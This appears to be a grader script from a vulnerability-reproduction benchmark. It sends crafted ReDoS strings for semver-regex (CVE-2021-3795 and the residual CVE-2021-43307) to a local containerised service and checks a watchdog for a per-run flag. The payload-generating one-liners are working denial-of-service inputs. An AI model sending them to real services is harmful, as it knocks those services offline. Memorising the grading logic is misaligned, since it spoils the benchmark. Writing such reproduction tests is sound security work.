#!/usr/bin/env bash
# verify.sh --seed|--residual — semver-regex pre-release ReDoS
# (CVE-2021-3795 seed / CVE-2021-43307 residual).
# Effect = event-loop hang -> watchdog releases the start-injected PCB_FLAG.
# Judge by matching that token to the current RUN_FLAG (wrong/stale override fails).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

CPORT=3000
PORT=""
WDPORT=""
for _ in $(seq 1 30); do
  PORT="$(dc port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  WDPORT="$(dc port watchdog 8888 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" && -n "$WDPORT" ]]; then
    break
  fi
  sleep 1
done
if [[ -z "$PORT" ]]; then
  echo "verify: compose port $VERSION:$CPORT failed (need --profile $VERSION)" >&2
  exit 20
fi
if [[ -z "$WDPORT" ]]; then
  echo "verify: compose port watchdog:8888 failed (need --profile $VERSION)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2021-3795: V0(3.1.1) hangs; V1(3.1.3) {0,100} bound → fast
  PAYLOAD="$("$PY" -c "print('1.2.3-' + 'a-a.'*22 + '!')")"
else
  # CVE-2021-43307 incomplete fix: V1 nested {0,100} still exponential
  PAYLOAD="$("$PY" -c "print('0.0.1-' + '-.--'*14 + ' ')")"
fi

# Fire the ReDoS (sync regex wedges the loop; curl timeout is expected on hang).
# Fast response => no hang this shot; still require watchdog token == current RUN_FLAG
# so a leftover/wrong/stale override cannot pass.
if curl -sS -m 3 -X POST "$BASE/check" -H 'Content-Type: application/json' \
     -d "{\"version\":\"$PAYLOAD\"}" >/dev/null 2>&1; then
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
  if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
fi

# Hang path: poll watchdog until start-injected PCB_FLAG is released.
ST=""; FLAG=""
for i in $(seq 1 20); do
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  [[ -n "$FLAG" ]] && break
  sleep 2
done
echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
